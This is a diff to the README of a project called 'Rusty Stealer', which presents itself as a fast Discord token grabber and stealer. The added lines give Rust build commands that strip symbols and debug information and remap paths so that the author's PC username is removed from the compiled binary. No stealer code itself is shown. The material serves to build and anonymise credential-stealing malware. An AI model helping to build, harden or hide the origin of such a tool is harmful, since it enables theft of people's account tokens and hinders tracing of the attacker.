@@ -1,6 +1,13 @@
 # Rusty Stealer 🚀
 - *a blazing fast Discord Token Grabber & Stealer, no popo made with python*
 
+## Build :
+```bash
+$env:RUSTFLAGS = "-Zlocation-detail=none -Ctarget-cpu=native -Cdebuginfo=0 -Zstrip=symbols -Zstrip=debuginfo --remap-path-prefix  C:\Users\$env:USERNAME\.cargo\registry\src\=caca"
+cargo build --release
+```
+- **--remap-path-prefix** remove your PC username in the output binary
+
 ## Fastest Token Grabber & Stealer **ever** :
 ```bash
 Rusty-Grabber> time ./target/release/grabber
